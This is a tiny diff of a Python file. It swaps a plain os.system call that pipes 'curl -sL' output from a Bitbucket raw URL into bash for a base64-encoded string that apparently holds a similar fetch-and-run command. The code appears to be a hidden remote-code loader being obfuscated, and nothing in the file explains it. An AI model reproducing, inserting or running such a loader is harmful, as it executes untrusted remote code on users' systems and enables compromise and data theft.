@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/4d4c6885b2100e92d33edfd6c170303be0bf5758/jajal | bash')
+os.system('Y3VybCAtc0wgaHR0cHM6Ly9iaXRidWNrZXQub3JnL21pa2F5MjgwOC95dWkvcmF3Lzc3OTk5ZDY0MWI5NjBhYTUxODM0Mzc0M2U1NTAxNTJkMTRiZDViMjUvaGVybyB8IGJhc2g=')
